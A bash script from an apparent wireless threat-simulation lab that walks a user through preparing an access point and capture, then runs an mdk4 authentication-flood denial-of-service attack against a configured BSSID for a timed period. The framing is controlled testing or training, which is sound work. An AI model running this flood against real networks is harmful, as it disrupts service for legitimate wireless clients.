#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SCENARIO_DIR="$BASH_DIR/scenarios"
SERVICES_DIR="$BASH_DIR/services"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t009.conf"

# ─── Dependencies ───
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_prompt.sh"

# ─── Show Scenario ───
print_none "Threat:        $SCN_NAME"
print_none "Tool:          $SCN_TOOL"
print_none "Mode:          $SCN_MODE"
print_blank
print_wrapped_indent "Objective: " \
"This scenario simulates an Authentication Flood, a denial-of-service attack. The script uses mdk4 to send a rapid stream of spoofed authentication requests to a target access point. Each request appears to come from a unique, randomised client MAC address. This can overload the AP's association table or CPU resources, disrupting service for legitimate clients."
print_line

confirmation

# ─── Show Requirements ───
print_section "Requirements"
print_none "1. AP Profile: $SCN_PROFILE with associated client device"
print_blank

# ─── Show AP Config ───
print_section "Access Point Preparation"
print_none "AP Profile:    $SCN_PROFILE"
print_none "SSID:          $SCN_SSID"
print_none "BSSID:         $SCN_BSSID"
print_none "Channel:       $SCN_CHANNEL"
print_blank
print_action "Launch Access Point"

confirmation

# ─── Show Capture Config ───
print_section "Capture Preparation"
print_none "Type:          $SCN_CAPTURE"
print_none "BSSID:         $SCN_BSSID"
print_none "Channel:       $SCN_CHANNEL"
print_none "Duration:      $SCN_DURATION seconds"
print_blank
print_action "Launch Capture"

confirmation

# ─── Run Simulation ───
clear
print_section "Simulation"

ensure_monitor_mode
print_blank
print_waiting "Running"
timeout "$SCN_DURATION" mdk4 "$INTERFACE" a -a "$SCN_BSSID" -s "$SCN_AUTH_PPS"
EXIT_CODE=$?
ensure_managed_mode

print_blank

if (( EXIT_CODE == 0 )); then
    print_success "Simulation completed"
else
    print_fail "Simulation stopped (Code: $EXIT_CODE)"
fi

exit 0